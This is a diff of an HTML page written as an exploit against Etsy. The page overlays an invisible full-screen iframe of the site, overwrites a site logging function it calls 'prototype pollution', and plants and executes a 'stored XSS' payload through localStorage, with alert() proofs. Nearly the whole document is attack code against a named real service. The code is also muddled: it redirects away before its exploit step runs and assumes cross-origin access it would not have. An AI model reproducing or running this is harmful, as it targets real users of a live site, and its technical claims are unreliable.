@@ -1,43 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <meta http-equiv="refresh" content="2;url=https://www.etsy.com">
-    <style>
-        iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0.01; /* Invisible iframe */
-            z-index: 9999;
-        }
-    </style>
-</head>
-<body>
-
+    <title>Redirecting...</title>
     <script>
-        // ** Step 1: Delay Before Injecting Exploit **
+        // Step 1: Redirect to Etsy after a short delay
         setTimeout(() => {
-            // Open an invisible iframe targeting Etsy
+            window.location.href = "https://www.etsy.com";
+        }, 1000);
+
+        // Step 2: After landing on Etsy, load exploit
+        setTimeout(() => {
             let iframe = document.createElement("iframe");
             iframe.src = "https://www.etsy.com";
             iframe.sandbox = "allow-scripts allow-same-origin";
+            iframe.style.position = "absolute";
+            iframe.style.top = "0";
+            iframe.style.left = "0";
+            iframe.style.width = "100%";
+            iframe.style.height = "100%";
+            iframe.style.opacity = "0.01"; // Invisible iframe
+            iframe.style.zIndex = "9999";
             document.body.appendChild(iframe);
 
-            // Ensure iframe loads before executing the exploit
             iframe.onload = function() {
                 let iwin = iframe.contentWindow;
-                
                 try {
-                    // ** Step 2: Exploit Prototype Pollution **
+                    // **Prototype Pollution Exploit**
                     iwin.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
                         alert("Prototype Pollution Exploited! Payload: " + payload);
                     };
                     iwin.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");
 
-                    // ** Step 3: Inject & Auto-Execute Stored XSS via LocalStorage **
+                    // **Stored XSS via LocalStorage**
                     iwin.localStorage.setItem("xss_payload", "alert('Stored XSS Triggered!');");
                     const payload = iwin.localStorage.getItem("xss_payload");
                     if (payload) {
@@ -47,8 +41,10 @@
                     console.log("Exploit failed:", e);
                 }
             };
-        }, 4000); // Delay exploit execution after redirection
+        }, 5000); // Delay execution to ensure the victim has landed
     </script>
-
+</head>
+<body>
+    <p>If you are not redirected, <a href="https://www.etsy.com">click here</a>.</p>
 </body>
 </html>
